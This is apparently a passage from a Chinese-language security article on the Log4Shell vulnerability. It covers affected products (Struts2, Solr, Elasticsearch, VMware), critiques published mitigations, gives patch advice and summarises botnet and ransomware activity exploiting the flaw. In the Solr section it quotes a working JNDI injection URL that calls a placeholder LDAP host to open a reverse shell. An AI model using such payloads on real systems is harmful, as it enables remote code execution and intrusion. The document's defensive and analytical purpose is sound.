[Apache Struts2](#toc_apache-struts2)
-------------------------------------

Apache Struts2 使用了 Log4j2 作为日志组件，并且默认的日志等级为 Info，在目前官方最新的 showcase 2.5.28 版本中，引用了 2.12.1 的 log4j-core 以及 log4j-api 组件，是包含漏洞的版本，所以 Struts2 也在此次受影响的范围之内。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/ab058d35-7335-4414-86d6-1f78e5fe6eed.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/38ced2e7-7319-4dbd-b70d-2e7e4698034c.png)

只需要找到在解析和处理请求时触发的异常以及日志记录位置并构造即可。整个 Struts2 的请求解析流程在我的前文[Struts2 系列漏洞调试总结](https://su18.org/post/struts2-5/)中有详细介绍，只要跟随调用找点即可，想挖洞的师傅可以自行跟随一下。

在且听安全公众号[发文](https://mp.weixin.qq.com/s/T-rcZnQxxUK1n2_lJNoUZg)中，披露了一处利用 `If-Modified-Since` header 解析异常调用 `LOG.warn()` 方法触发的姿势，漏洞复现如下：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/b633ef69-a737-4990-a303-c1ee277a82ea.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/329350d8-e107-4f50-967b-61849863faaa.png)

[Apache Solr](#toc_apache-solr)
-------------------------------

Apache Solr 是 Apache Lucene 项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本（如 Word、PDF）的处理。当然也是此次漏洞的受害者。

官方通告：[https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228](https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228)

Apache Solr 的 POC 都已经传遍了世界，如下：

`/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json` 

当然入口点也肯定不止这一个，挖掘思路与 Struts2 类似，只需要找到点就可以了。

[Elasticsearch](#toc_elasticsearch)
-----------------------------------

根据 Elasticsearch 在官方论坛里发布的公告，Elasticsearch 5.0.0+ 版本包含了带有漏洞版本的 Log4j2 包，但由于其使用了 Java Security Manager，减轻了受到的危害。

phith0n 师傅在知识星球上发布了其[研究成果](https://wx.zsxq.com/dweb2/index/topic_detail/818814858152212)，经其实测发现，写入操作一般会写日志。并给出测试时 dnslog 的截图。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/04878cbc-3d71-4887-9fb9-48529245aa7d.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/573ab34e-f334-4181-9491-e1420687fca7.png)

在 B 站上，也有一位名为杰锐朱的 UP 主发布了相关的 DEBUG 及分析，链接在[这里](https://www.bilibili.com/video/BV1Ua411r7zN)。关于相关的细节，这位 UP 主的介绍以及足够，这里就不再重复，师傅们可以自行跟调。

总体来说，在漏洞存在的版本，存在 Lookup 渲染的功能，可以配合 dnslog 进行测试，但由于 SM 的介入，使用 ldap 执行远程恶意类时会由于权限不足而抛出异常，因此大大减轻的实际受到的攻击威胁。

提到 ES，那顺便也提一下本家的 logstash，logstash 也受到本次漏洞的危害，并在漏洞爆发后更新了 Log4j2 的版本。在 Twitter 上有老外发出截图展示其脆弱性：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/29fb9e24-d124-4e44-a6d2-48b1a8f409fb.jpeg?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/ae37022c-f8e4-4248-9fff-4a67c75d7d21.jpeg)

[vmware 产品线](#toc_vmware)
-------------------------

根据 VMware 的[官方安全通告](https://www.vmware.com/security/advisories/VMSA-2021-0028.html)，包括 vCenter 在内的多个产品均受到了此次安全漏洞的影响，并且提供了受影响产品的环境的版本号。

以下为启明星辰 ADLab 在其[公众号文章](https://mp.weixin.qq.com/s/J5H9aZVhwQaVn3LvKi2Kqw)中发布的 2 张复现截图。

[![](https://storage.tttang.com/media/attachment/2021/12/15/6abb95c7-9404-47ab-bf41-2b![1639297743749.jpg](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/e1ba5187-5abe-41f7-8f5f-8910f01bffc0.jpeg?raw=true)233e3fc596.jpg)
](https://storage.tttang.com/media/attachment/2021/12/15/6abb95c7-9404-47ab-bf41-2b![1639297743749.jpg](https://storage.tttang.com/media/attachment/2021/12/15/7a99b4dd-c5bd-4923-b476-8a71232fa813.jpg)233e3fc596.jpg)

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/01b9e631-fc19-42ec-ba59-19e7f3eff059.jpeg?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/200123bb-79af-46a4-9d67-8b15dc14a2a2.jpg)[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/b5bdcf48-112e-4488-a481-1030eec9e927.jpeg?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/f0c62e0d-4d39-4d3d-b783-bbb354407550.jpg)

而在 Twitter 上也流传出使用 `X-Forwarded-For` 配置为 POC 触发漏洞攻击 VCenter 的信息。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/b3ab8e8a-0638-4f19-8c82-2830639d75c0.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/ee63f48e-fe8a-4790-80a3-3d3d0c1992f3.png)

[其他](#toc__10)
--------------

其他受影响组件还有很多很多，这里只列举了大家讨论和关心较多的几个，大家可以根据上面的几个查询连接信息查找，并自行探究利用方式。

这里墨菲安全实验室也发布了本次 Log4j2 供应链级别分析，文章在[这里](https://mp.weixin.qq.com/s/pBythwQB8az9J7wyPBVXaw)。

随着漏洞细节、姿势的不断披露，各个安全厂商和从业者发布了若干漏洞修复的建议和手段，部分公司和团队还发布了针对本次漏洞防御的小工具、项目用来缓解和免疫相关攻击。那么哪些修复效果是有效的呢？最好的修复方式是那种呢？

[修复建议](#toc__11)
----------------

由于大多数公众号给出的修复措施均为复制粘贴的，这里就整理的较全的奇安信威胁情报中心的[文章](https://mp.weixin.qq.com/s/oWOJIJAR7915b28X3vtM8g)中的修复建议进行探索。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/c0472934-2755-4b52-b420-1b0983a32a17.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/20454075-5c97-480e-a3a9-426498148a3f.png)

在这些修复建议里，存在的问题是：  
\- 在 jvm 参数、配置、环境系统变量中设置 nolookups：关闭 lookup 功能，但是只限版本 > 2.10，低版本不生效。  
\- 更新 jdk 版本：借助 JEP 290 及其他安全特性来降低风险，只能说是一种思路，治标不治本  
\- 限制外连：可行，但也要看业务情况  
\- 移除包中的 JndiLookup class：可行  
\- 禁用 JNDI ：可行  
\- 其他防御措施：WAF/RASP，确保防御逻辑是正确的。

关于修复建议，在360安全忍者的星球[文章](https://wx.zsxq.com/dweb2/index/topic_detail/818814851554482)中有较为详细的讨论，提到了在不同业务场景下，不能盲目使用网上提供的环境变量修复参数进行“一刀切”，而且要考虑不同版本不同需求情况下的安全可落地的解决方案。

与此同时，很多团队和公司给出了自己缓解措施解决方案，下面随便列举几个发在 Github 上的：  
\- [https://github.com/javasec/log4j-patch](https://github.com/javasec/log4j-patch)  
\- [https://github.com/chaitin/log4j2-vaccine](https://github.com/chaitin/log4j2-vaccine)  
\- [https://github.com/qingtengyun/cve-2021-44228-qingteng-online-patch](https://github.com/qingtengyun/cve-2021-44228-qingteng-online-patch)  
\- [https://github.com/Cybereason/Logout4Shell](https://github.com/Cybereason/Logout4Shell)  
\- ...

这里有删除关键类的、javaagent 技术的、甚至以洞打洞以洞修洞的，对于以上项目作者没有亲自使用过，各位自行测试。

[真正的安全建议](#toc__12)
-------------------

截止到目前发文时间，根据上述知识，我这里给出修复建议：  
\- 如果在记录日志时动态使用到了 lookup 特性，建议更新到 2.15.0-rc2 安全版本，并确认不开启 JNDI Lookup 功能；  
\- 如果确认没有在记录日志时动态解析 lookup 及替换，建议更新到 2.16.0-rc1 最新版本，此版本移除了对记录日志的 lookup 支持。

若由于各种原因无法更新依赖库版本，则建议：  
\- 删除依赖库中对应的 jndi lookup 类的 class 文件，在程序无法找到对应类时，将不会进行加载。  
\- 使用 RASP 技术进行安全防御。

由于本漏洞影响巨大，建议要求开发人员了解漏洞原理，重复确认自己的配置。

对于出现在开源项目、框架、组件中受到影响的情况，建议积极关注各个官方给出的安全通告及安全更新，并在修复期间使用其他类型的防御手段减轻受到攻击的可能性。

如果你是安全从业人员，建议你确认你的修复方案是稳定、通用、有效的，再给到客户。

[威胁情报](#toc__13)
----------------

奇安信 CERT 发布了漏洞相关攻击的 [IOC](https://mp.weixin.qq.com/s/kOadrJtWBOLZefp4pAGHzQ)，并创建了一个 Github 项目用来持续收集整理：[https://github.com/RedDrip7/Log4Shell\_CVE-2021-44228\_related\_attacks\_IOCs](https://github.com/RedDrip7/Log4Shell_CVE-2021-44228_related_attacks_IOCs)

项目里提供了 Snort、Suricata、IOC、IP 等威胁情报供安防人员使用。

Twitter 账户 @bad_packets 也发布了一些捕获的样本并提取了其中的恶意 IP，主题帖在这里：[https://twitter.com/bad_packets/status/1469408389331488771](https://twitter.com/bad_packets/status/1469408389331488771)

此漏洞由于受灾面广，很容易被用来作为蠕虫病毒的传播，更是被人称为黑产者的狂欢，作为防御人员，也应结合相关威胁情报进行防御。

根据 360 Netlab 以及深信服威胁情报团队给出的威胁情报及云端检测数据，目前该漏洞已被多个黑产组织武器化，添加到自身的武器库中以发起网络攻击，并且捕获到 H2Miner、Mirai、Muhstik、Z0Miner 等数十个病毒家族都已使用此漏洞进行攻击。

根据 360 Netlab 的[分析](https://blog.netlab.360.com/wei-xie-kuai-xun-log4jlou-dong-yi-jing-bei-yong-lai-zu-jian-botnet-zhen-dui-linuxshe-bei/)，目前 log4j2 漏洞已经被用来组建 botnet，主要针对 Linux。随后 360 Netlab 又发布了第二篇[分析](https://blog.netlab.360.com/yi-jing-you-xxxge-jia-zu-de-botnetli-yong-log4shelllou-dong-chuan-bo-wei-da-bu-ding-de-gan-jin-liao/)，利用其全球的节点，分析了攻击分布、攻击IP溯源、样本及Botnet家族，并给出了部分攻击源IP。

根据千里目安全实验室给出的[Log4j2黑产分析报告](https://www.4hou.com/posts/3Vv4)，这里从中截取了几个病毒家族的攻击流程分析:

以下为 Mirai 僵尸网络整体攻击流程:

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/fdfc7f9c-7fa9-4baf-89a9-9b34158e50e1.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/1a9fddf5-a0c9-40b2-9a3d-9e1477871360.png)

以下为 H2Miner 挖矿木马整体攻击流程：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/2bb946af-b99f-442b-a7ee-bea8a97cd45d.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/fc6f9c0d-64aa-4bba-a6b0-18cd962261da.png)

以下为 Muhstik 僵尸网络整体攻击流程：

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/6de3459a-f194-44fb-80df-86050787c815.png?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/05112cec-212e-4b27-9edd-ea67b8037d41.png)

可以看到，病毒使用 log4j2 漏洞作为入口，借助执行任意代码的能力，进行进一步的内网攻击或挖矿等操作，可以预知的是，将有越来越多的蠕虫及病毒使用 log4j2 漏洞进行攻击和传播。

此外，根据 Cado Security 的消息，已经有结合 log4j2 及勒索病毒的攻击链路出现，新型勒索软件 Khonsari 借助 log4j2 的影响力来进行带有文件加密及勒索行为的攻击。

[![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/7/3c3085c9-55e8-4302-bbb9-d07e7b7704c9.jpeg?raw=true)
](https://storage.tttang.com/media/attachment/2021/12/15/217e0d9a-6fcb-4089-a43e-47255d4199d5.jpg)

可以确定的是，在未来几年内，将会有诸多黑产从业者使用本次 log4j2 漏洞作为攻击入口，企业和信息系统拥有者应该及时更新并持续关注此漏洞的后续信息。

本次漏洞对业内影响巨大，有一点感触：

1.  希望安全从业人员以及安全厂商在发文时，能小心求证，用技术说话，不要为了求速度、抢热度而复制粘贴，在没有测试、求证、实践的情况下发布信息、解决方案等，这都是不负责任的体现，作为大厂，应该有责任和担当；
2.  开发人员的安全意识不够时，写出来的漏洞危害将会是巨大的，这不能只依赖安全从业人员来通报漏洞，在开发各个环节中的安全都应该落地，DevSecOps 不能只图一乐；
3.  据说这个漏洞是使用 codeql 发现的，此条消息我没有求证，但无论如何，自动化漏洞挖掘的技术都应该加速发展，在这种级别的漏洞被提出之前能快速内部发现，避免造成危害。